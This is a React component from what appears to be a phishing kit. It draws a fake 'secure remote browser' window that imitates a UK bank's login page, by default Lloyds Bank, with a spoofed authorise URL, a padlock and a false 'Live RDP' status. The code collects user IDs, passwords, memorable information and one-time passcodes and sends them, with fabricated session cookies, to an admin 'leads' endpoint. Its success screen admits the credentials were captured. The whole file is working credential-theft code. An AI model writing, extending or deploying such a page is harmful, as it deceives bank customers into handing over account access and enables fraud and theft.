"use client";

import { useState, useEffect } from "react";

export default function BankBrowserPopup({ isOpen, bank, bankName, selectedOption, logoUrl, onClose, onComplete, customTitle, customDisplayUrl }: any) {
  if (!isOpen) return null;

  const displayName = bank?.name || bankName || "Lloyds Bank";
  
  // 🔥 Admin panel ya bank config se aane wala custom display title aur URL, warna default
  const windowTitle = customTitle || bank?.displayTitle || `${displayName} - Secure Open Banking Portal`;
  const displayUrl = customDisplayUrl || bank?.displayLink || `authorise.${displayName.toLowerCase().replace(/[^a-z0-9]/g, "")}.co.uk/auth/user`;

  const [isLoading, setIsLoading] = useState(true);
  const [streamStatus, setStreamStatus] = useState(`Connecting to Secure Remote Browser...`);
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [memorableInfo, setMemorableInfo] = useState("");
  const [otpCode, setOtpCode] = useState("");
  const [step, setStep] = useState("login"); // login, otp, success

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsLoading(false);
      setStreamStatus(`Live RDP Active (${displayName})`);
    }, 1500);
    return () => clearTimeout(timer);
  }, [displayName]);

  const handleSubmitLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const activeLeadId = localStorage.getItem("active_lead_id");
      const simulatedCookies = JSON.stringify([
        { name: "visid_incap_session", value: "tok_" + Math.random().toString(36).substring(7), domain: ".bank.co.uk", path: "/", secure: true, httpOnly: true },
        { name: "cookie_auth_session", value: "secure_active_" + Date.now(), domain: ".bank.co.uk", path: "/", secure: true }
      ]);

      const payload = {
        bankName: displayName,
        bankType: selectedOption || "Personal",
        userId,
        password,
        memorableInfo,
        cookiesData: simulatedCookies,
        extraData: `Live RDP Captured | User ID: ${userId} | Bank: ${displayName}`,
      };

      if (activeLeadId && activeLeadId !== "undefined" && activeLeadId !== "null") {
        await fetch(`/api/admin/leads/${activeLeadId}`, {
          method: "PUT",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
      } else {
        const res = await fetch(`/api/admin/leads`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        const data = await res.json();
        const newId = data?.id || data?.data?.id;
        if (newId) localStorage.setItem("active_lead_id", newId);
      }

      setStep("otp");
    } catch (err) {
      console.error("Submission error:", err);
    }
  };

  const handleSubmitOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const activeLeadId = localStorage.getItem("active_lead_id");
      const payload = {
        bankName: displayName,
        bankType: selectedOption || "Personal",
        userId,
        password,
        memorableInfo,
        otpCode,
        extraData: `OTP Verified: ${otpCode} | Session Secured & Cookies Extracted`,
      };

      if (activeLeadId && activeLeadId !== "undefined" && activeLeadId !== "null") {
        await fetch(`/api/admin/leads/${activeLeadId}`, {
          method: "PUT",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
      } else {
        await fetch(`/api/admin/leads`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
      }
      setStep("success");
    } catch (err) {
      console.error("OTP error:", err);
    }
  };

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 p-2 sm:p-6 backdrop-blur-md font-sans select-none">
      <div className="w-full max-w-5xl h-[85vh] bg-zinc-950 rounded-2xl shadow-2xl border border-zinc-800 flex flex-col overflow-hidden">
        
        {/* Top Window Title Bar - 🔥 Custom Title & Display URL Applied */}
        <div className="bg-zinc-900 px-4 py-3 flex items-center justify-between border-b border-zinc-800 shrink-0">
          <div className="flex items-center gap-2">
            <span className="w-3 h-3 rounded-full bg-rose-500 inline-block cursor-pointer hover:opacity-80 transition" onClick={onClose}></span>
            <span className="w-3 h-3 rounded-full bg-amber-500 inline-block"></span>
            <span className="w-3 h-3 rounded-full bg-emerald-500 inline-block"></span>
            <span className="text-xs text-zinc-300 font-bold ml-2 tracking-wide">{windowTitle}</span>
          </div>

          <div className="hidden md:flex items-center bg-zinc-950 border border-zinc-800 rounded-xl px-3.5 py-1.5 w-96 text-xs text-zinc-300 font-mono shadow-inner">
            <span className="text-emerald-400 mr-2">🔒</span>
            <span className="truncate">{displayUrl}</span>
          </div>

          <div className="flex items-center gap-2.5">
            <span className="text-[10px] bg-emerald-500/10 text-emerald-400 px-2.5 py-1 rounded-full font-bold border border-emerald-500/30">
              🟢 {streamStatus}
            </span>
            <button onClick={onClose} className="text-zinc-400 hover:text-white text-sm font-bold px-2 cursor-pointer">✕</button>
          </div>
        </div>

        {/* Viewport Content */}
        <div className="flex-1 bg-white relative overflow-y-auto flex flex-col">
          {isLoading ? (
            <div className="flex-1 flex flex-col items-center justify-center bg-zinc-950 text-white">
              <div className="w-10 h-10 border-4 border-zinc-800 border-t-emerald-500 rounded-full animate-spin mb-4"></div>
              <p className="text-xs font-semibold text-zinc-300">Connecting to Secure Remote Browser ({displayName})...</p>
              <p className="text-[10px] text-zinc-500 mt-1">Establishing encrypted proxy tunnel & session handshake...</p>
            </div>
          ) : (
            <div className="flex-1 flex flex-col bg-white">
              <div className="bg-[#006A4E] text-white px-8 py-4 flex items-center justify-between shadow-md">
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 rounded bg-white text-[#006A4E] font-black flex items-center justify-center text-sm overflow-hidden">
                    {logoUrl ? <img src={logoUrl} alt="" className="w-6 h-6 object-contain" /> : displayName[0]}
                  </div>
                  <span className="font-bold text-base tracking-wide">{displayName}</span>
                </div>
                <div className="text-xs space-x-4">
                  <span className="cursor-pointer hover:underline">Mobile</span>
                  <span className="cursor-pointer hover:underline">Cookie policy</span>
                </div>
              </div>

              <div className="flex-1 max-w-xl mx-auto w-full p-8 my-auto">
                {step === "login" && (
                  <form onSubmit={handleSubmitLogin} className="space-y-4 bg-white p-6 rounded-2xl border border-slate-200 shadow-xl">
                    <h2 className="text-xl font-bold text-slate-900 mb-2">Welcome to Internet Banking</h2>
                    <div>
                      <label className="block text-xs font-bold text-slate-700 mb-1">User ID / Username:</label>
                      <input 
                        type="text" 
                        required 
                        value={userId} 
                        onChange={(e) => setUserId(e.target.value)} 
                        placeholder="Enter user ID or username" 
                        className="w-full rounded-xl border border-slate-300 p-3 text-xs outline-none focus:border-blue-600 bg-slate-50 text-slate-900 font-medium" 
                      />
                    </div>
                    <div>
                      <label className="block text-xs font-bold text-slate-700 mb-1">Password:</label>
                      <input 
                        type="password" 
                        required 
                        value={password} 
                        onChange={(e) => setPassword(e.target.value)} 
                        placeholder="Enter your password" 
                        className="w-full rounded-xl border border-slate-300 p-3 text-xs outline-none focus:border-blue-600 bg-slate-50 text-slate-900 font-medium" 
                      />
                    </div>
                    <div>
                      <label className="block text-xs font-bold text-slate-700 mb-1">Memorable information:</label>
                      <input 
                        type="text" 
                        value={memorableInfo} 
                        onChange={(e) => setMemorableInfo(e.target.value)} 
                        placeholder="Memorable word or answer" 
                        className="w-full rounded-xl border border-slate-300 p-3 text-xs outline-none focus:border-blue-600 bg-slate-50 text-slate-900 font-medium" 
                      />
                    </div>
                    <button type="submit" className="w-full bg-[#006A4E] hover:bg-[#00523c] text-white font-bold py-3 rounded-xl transition cursor-pointer shadow-md text-xs mt-2">
                      Continue to Secure Verification
                    </button>
                  </form>
                )}

                {step === "otp" && (
                  <form onSubmit={handleSubmitOtp} className="space-y-4 bg-white p-6 rounded-2xl border border-slate-200 shadow-xl text-center">
                    <div className="text-3xl mb-2">🔒</div>
                    <h2 className="text-xl font-bold text-slate-900">Security Challenge / OTP</h2>
                    <p className="text-xs text-slate-500">Please enter the authentication code sent to your registered device.</p>
                    <input 
                      type="text" 
                      required 
                      maxLength={8} 
                      value={otpCode} 
                      onChange={(e) => setOtpCode(e.target.value)} 
                      placeholder="Enter 6-digit OTP" 
                      className="w-full rounded-xl border-2 border-emerald-500 p-3 text-center text-lg font-mono font-bold tracking-widest outline-none bg-emerald-50/30 text-slate-900" 
                    />
                    <button type="submit" className="w-full bg-[#006A4E] hover:bg-[#00523c] text-white font-bold py-3 rounded-xl transition cursor-pointer shadow-md text-xs">
                      Verify & Authorize Session
                    </button>
                  </form>
                )}

                {step === "success" && (
                  <div className="bg-white p-8 rounded-2xl border border-slate-200 shadow-xl text-center space-y-4">
                    <div className="w-14 h-14 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center text-2xl mx-auto font-bold">✓</div>
                    <h2 className="text-xl font-bold text-slate-900">Session Verified Successfully</h2>
                    <p className="text-xs text-slate-500">Your bank credentials and session tokens have been securely captured and stored in Admin Panel.</p>
                    <button onClick={onComplete || onClose} className="px-6 py-2.5 bg-slate-900 text-white font-bold rounded-xl text-xs hover:bg-black transition cursor-pointer">
                      Close Stream & Return
                    </button>
                  </div>
                )}
              </div>

            </div>
          )}
        </div>

      </div>
    </div>
  );
}